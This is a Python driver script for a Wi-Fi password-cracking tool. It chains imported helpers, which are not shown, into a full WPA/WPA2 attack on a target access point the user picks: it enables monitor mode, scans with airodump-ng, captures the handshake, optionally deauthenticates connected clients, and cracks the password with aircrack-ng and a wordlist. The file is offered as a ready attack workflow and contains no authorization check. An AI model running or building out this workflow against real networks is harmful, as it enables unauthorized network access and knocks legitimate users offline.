# Importing functions from modules for better organization
from monitor import start_monitor, stop_monitor
from scanner import scan_for_aps
from handshake import capture_handshake
from deauth import deauth_clients
from cracker import crack_password

def main():
    # Step 1 & 2: swet wlan to monitor mode and kill any interfering processes
    start_monitor()

    # Step 3: Use airodump-ng to scan nearby Wi-Fi access points
    scan_for_aps()

    # Prompt user to input target acess point info after manually selecting one from scan results
    bssid = input("Enter the target BSSID: ").strip()
    channel = input("Enter the target channel number: ").strip()
    filename = input("Enter the file name to save capture (no extension): ").strip()

    # Step 4: Capture the WPA/WPA2 handshake using airodump-ng
    capture_handshake(bssid, channel, filename)

    # Optional step: Ask the user whether to perform a deauthentication attack to accelerate handshake capture
    if input("Do you want to deauth clients? (yes/no): ").strip().lower() == "yes":
        deauth_clients(bssid)

    # Step 5: Stop monitor mode and return the wireless card to managed mode
    stop_monitor()

    # Step 6: Attempt to crack the captured handshake using aircrack-ng and a wordlist
    crack_password(filename)

if __name__ == "__main__":
    main()
